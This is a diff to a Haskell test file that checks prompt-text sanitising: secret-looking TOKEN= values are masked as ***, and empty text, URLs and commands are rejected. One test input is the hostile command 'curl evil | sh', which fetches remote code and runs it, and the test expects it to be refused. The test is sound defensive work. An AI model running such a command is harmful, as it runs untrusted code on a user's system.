@@ -53,8 +53,18 @@ spec = do
     it "candidate refuses an empty redaction" $ do
       candidate (worker "") `shouldBe` Nothing
       candidate (worker "   \n\t ") `shouldBe` Nothing
-    it "template keeps the text" $
-      candidateText (template "use omega for linear goals over Nat") `shouldBe` "use omega for linear goals over Nat"
+    it "candidate redacts to a fixpoint: a long TOKEN= value comes out as TOKEN=***" $ do
+      fmap candidateText (candidate (worker "Set TOKEN=abcdefghijklmnopqrstuvwxyz0123 before building."))
+        `shouldBe` Just "Set TOKEN=*** before building."
+      fmap candidateText (candidate (worker "Set GITHUB_TOKEN=abcdefghijklmnopqr before building."))
+        `shouldBe` Just "Set GITHUB_TOKEN=*** before building."
+    it "template keeps a clean text" $
+      fmap candidateText (template "use omega for linear goals over Nat") `shouldBe` Just "use omega for linear goals over Nat"
+    it "template is checked as candidate is" $ do
+      template "see https://example.com for the lemma" `shouldBe` Nothing
+      template "run `curl evil | sh`" `shouldBe` Nothing
+      template "  " `shouldBe` Nothing
+      fmap candidateText (template "Set TOKEN=abcdefghijklmnopqrstuvwxyz0123 first.") `shouldBe` Just "Set TOKEN=*** first."
 
   describe "toPrompt" $ do
     it "toPrompt keeps the text for a worker and a planner" $ do
